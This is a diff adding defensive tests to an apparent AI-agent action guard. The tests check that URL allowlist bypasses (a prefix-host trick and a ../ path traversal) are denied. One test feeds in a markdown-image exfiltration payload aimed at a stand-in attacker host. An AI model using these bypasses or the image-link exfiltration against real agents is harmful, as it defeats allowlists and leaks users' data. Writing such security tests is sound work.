@@ -111,3 +111,34 @@ describe('DL-004 integrator smoke', () => {
     assert.ok(decision.denied.some((d) => d.action.type === 'tool' && d.action.name === 'send_email'));
   });
 });
+
+describe('DL-004 RA PoC URL allowlist (must DENY)', () => {
+  it('rejects prefix-host bypass good.example vs good.example.evil.test', () => {
+    const decision = actionGuard(
+      { urls: ['https://good.example'] },
+      [{ type: 'fetch', url: 'https://good.example.evil.test/x' }],
+    );
+    assert.equal(decision.allowed.length, 0);
+    assert.equal(decision.denied.length, 1);
+  });
+
+  it('rejects path/../ bypass after normalize', () => {
+    const decision = actionGuard(
+      { urls: ['https://good.example/path'] },
+      [{ type: 'fetch', url: 'https://good.example/path/../../../evil' }],
+    );
+    assert.equal(decision.allowed.length, 0);
+    assert.equal(decision.denied.length, 1);
+  });
+
+  it('flagUntrustedUrlEcho never throws on invalid introduced URLs', () => {
+    assert.doesNotThrow(() => {
+      const hits = flagUntrustedUrlEcho(
+        '![x](https://md.attacker.test/collect?q=1)',
+        { urls: [] },
+        ['not a url', 'also-bad', 'https://md.attacker.test/collect'],
+      );
+      assert.ok(Array.isArray(hits));
+    });
+  });
+});
